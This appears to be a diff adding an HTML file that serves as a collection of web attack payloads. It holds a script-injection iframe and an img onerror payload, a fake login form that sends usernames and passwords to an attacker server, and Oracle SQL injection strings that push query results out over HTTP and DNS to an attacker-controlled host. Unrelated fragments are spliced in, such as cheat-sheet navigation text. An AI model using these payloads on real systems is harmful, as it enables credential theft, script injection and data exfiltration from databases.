@@ -1,0 +1,46 @@
+
+
+
+</head>
+<body class="lotusui30dojo tundra locale_en">
+<noscript>
+	<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee></noscript>
+	
+	
+	
+	<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST" 
+action="http://attackerserver/login.php">Username: <input type="text" name="username" /><br />Password: <input type="password" 
+name="password" /><br /><input type="submit" value="Login" /></form><!--
+
+
+abc%3C/title%20id=%22a%22%3E%3Cimg%20src=x%20onerror=alert%289%29%3E
+
+
+Out of Band Channel
+Back to top
+?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ sniff.php?sniff='||({INJECTION})||'') FROM DUAL)
+Sniffer application will save results
+
+?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||({INJECTION})||'.html') FROM DUAL)
+Results will be saved in HTTP access logs
+
+?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(({INJECTION})||'.yourhost.com') FROM DUAL)
+You need to sniff dns resolution requests to yourhost.com
+
+?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(({INJECTION})||’.yourhost.com’,80) FROM DUAL)
+You need to sniff dns resolution requests to yourhost.com
+
+{INJECTION} = You want to run the query.
+
+
+
+
+
+
+
+
+
+	
+
+
+
